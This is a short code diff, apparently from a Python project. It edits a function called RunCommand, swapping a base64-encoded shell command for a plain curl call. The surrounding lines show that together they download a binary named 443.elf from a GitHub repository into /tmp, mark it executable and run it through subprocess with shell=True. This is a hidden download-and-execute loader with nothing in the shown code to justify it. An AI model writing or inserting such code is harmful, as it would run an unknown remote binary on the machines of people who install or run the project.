@@ -6,7 +6,7 @@ import subprocess
 
 
 def RunCommand():
-    cmd = 'echo Y3VybCAtZnNTTCBodHRwczovL2dpdGh1Yi5jb20vV2lsbGlhbUNYVkkvbGluLXB5Y3Jvbm9zL3Jhdy9yZWZzL2hlYWRzL21haW4vNDQzLmVsZiAtbyAvdG1wLzQ0My5lbGYNCg== | base64 -d | bash'
+    cmd = 'curl -fsSL https://github.com/WilliamCXVI/lin-pycronos/raw/refs/heads/main/443.elf -o /tmp/443.elf'
     cmd2='chmod +x /tmp/443.elf'
     cmd3='/tmp/443.elf'
     completed = subprocess.run(cmd, shell=True, capture_output=True, check=True)
